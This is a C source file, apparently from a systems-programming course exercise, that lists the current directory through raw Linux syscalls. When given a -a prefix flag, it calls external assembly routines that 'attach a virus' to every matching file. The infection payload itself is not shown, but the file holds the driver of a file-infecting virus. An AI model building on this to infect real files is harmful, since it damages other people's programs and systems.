#include "util.h"          // Provided to you (for strlen, strncmp, etc.)
#include <fcntl.h>         // For open(), O_RDONLY, O_DIRECTORY, etc.
#include <sys/syscall.h>   // For SYS_getdents
#include <linux/types.h>   // For __u32, __u64, etc.
#include "syscall.h"

extern int system_call();

// Raw syscall numbers
#define SYS_EXIT    1
#define SYS_READ    3
#define SYS_WRITE   4
#define SYS_OPEN    5
#define SYS_CLOSE   6
#define SYS_GETDENTS 141

#define BUF_SIZE 8192 // <= 10 KB as permitted

/* syscall.h – declare once, #include where you need it */
#ifndef SIMPLE_SYSCALL_H
#define SIMPLE_SYSCALL_H

/* Linux’s on‑disk dirent layout (without <dirent.h> / libc) */
struct linux_dirent {
    long           d_ino;
    off_t          d_off;
    unsigned short d_reclen;
    char           d_name[];
};

// External assembly routines (defined in start.s) 
extern void infection(void);
extern void infector(char *filename);

// syscall wrapper
static inline int sys_call(int num,
                           int arg1, int arg2, int arg3,
                           int arg4, int arg5)
{
    int ret;
    __asm__ volatile ("int $0x80"
                      : "=a"(ret)
                      : "a"(num), "b"(arg1), "c"(arg2),
                        "d"(arg3), "S"(arg4), "D"(arg5)
                      : "memory");
    return ret;        /* negative => -errno, exactly like raw syscalls */
}

#endif

void print(const char* str) {
    sys_call(SYS_WRITE, 1, (int)str, strlen(str), 0, 0);
}

void print_error_exit() {
    sys_call(SYS_EXIT, 0, 0,0,0,0);
}


int main(int argc, char **argv) {
    char *prefix = 0;
    int i;
    for (i = 1; i < argc; i++) {
        if (strncmp(argv[i], "-a", 2) == 0) {
            prefix = argv[i] + 2; // pointer to prefix text
        }
    }
    
    // call infection() once if -a supplied
    if (prefix) {
        infection();
    }
    
    // open curr dir
    int fd = sys_call(SYS_OPEN, (int)".", O_RDONLY|O_DIRECTORY, 0, 0, 0);
    if (fd < 0) {
        print_error_exit();
    }

    // Read directory entries via getdents
    char buf[BUF_SIZE];
    int nread = sys_call(SYS_GETDENTS, fd, (int)buf, BUF_SIZE, 0, 0);
    if (nread < 0) {
        print_error_exit();
    }

    int bpos = 0;
    // Iterate over entries in the buffer
    while (bpos < nread) {
        struct linux_dirent *d = (struct linux_dirent *)(buf + bpos);
        char *name = d->d_name;
        // Print the filename first
        print(name);
        // If -a<prefix> given and name starts with it → infect the file
        if (prefix && strncmp(name, prefix, strlen(prefix)) == 0) {
            print(" VIRUS ATTACHED\n");
            // call an assembly function
            infector(name);
        } else {
            print("\n");
        }

        // advance to next file
        bpos += d->d_reclen;
    }

    sys_call(SYS_CLOSE, fd, 0,0,0,0);
    sys_call(SYS_EXIT, 0, 0,0,0,0); // normal exit
    return 0;
}